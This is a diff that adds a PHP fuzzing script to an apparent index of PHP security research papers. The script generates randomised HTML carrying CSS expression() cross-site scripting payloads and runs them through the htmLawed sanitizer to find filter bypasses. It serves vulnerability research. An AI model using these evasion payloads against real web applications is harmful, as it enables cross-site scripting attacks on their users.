@@ -5689,3 +5689,59 @@ Php Codz Hacking (http://www.80vul.com/pch/)
 | PCH-003   | [mb_ereg(i)_replace()代码注射漏洞及其延伸出的正则应用安全问题](https://github.com/80vul/phpcodz/blob/master/research/pch-003.md) |
 | PCH-002   | [preg_match(_all)的变量初始化问题](https://github.com/80vul/phpcodz/blob/master/research/pch-002.md) |
 | PCH-001   | [intval()使用不当导致安全漏洞](https://github.com/80vul/phpcodz/blob/master/research/pch-001.md) |
+#php fuzz code 自定义
+```
+#!php
+<?php
+include './htmLawed.php';
+$m1=array("'","\""," ","");
+$m2=array("","","\"","'","<","","","","","","","","");
+$mag=array("'","\""," ","</div>","/*","*/","\\","\\\"","\\\'",";",":","<",">","=","<div","\r\n","","&#","/","*","expression(","w:expression(alert(9));","style=w:expression(alert(9));","");
+for($i=0;$i<10000;$i++)
+{
+$fname = "tc\\hush".$i.".html";
+$fp = fopen($fname, "a");
+$mtotran = "";
+for($j=0;$j<1000;$j++)
+{
+shuffle($mag);
+shuffle($m1);
+shuffle($m2);
+$mstr=$m2[0];
+$mstr.="<div id=";
+$mstr.=$m1[0];
+$mstr.=$mag[0];
+$mstr.=$mag[1];
+shuffle($mag);
+$mstr.=$mag[0];
+$mstr.=$m1[0];
+$mstr.=" style=";
+shuffle($m1);
+$mstr.=$m1[0];
+$mstr.="w:exp/*";
+shuffle($mag);
+$mstr.=$mag[0];
+$mstr.=$mag[1];
+$mstr.="*/ression(alert(9));";
+shuffle($mag);
+$mstr.=$mag[0];
+$mstr.=$mag[1];
+$mstr.=$m1[0];
+$mstr.=">".$j."</div>\r\n";
+fwrite($fp, $mstr);
+$mtotran.=$mstr;
+}
+fclose($fp);
+$outcont = htmLawed($mtotran);
+// print $outcont."\r\n";
+$fp1 = fopen("C:\\Inetpub\\wwwroot\\out\\hush".$i.".html", "a");
+fwrite($fp1, "<HTML>\r\n<HEAD>\r\n<TITLE>".$i."</TITLE>\r\n<meta http-equiv=\"refresh\" content=\"1;url=hush".($i+1).".html\">\r\n</HEAD>\r\n<BODY>\r\n");
+fwrite($fp1, $outcont);
+fwrite($fp1, "</BODY>\r\n</HTML>");
+fclose($fp1);
+print $i."\r\n";
+// break;
+}
+?>
+
+```
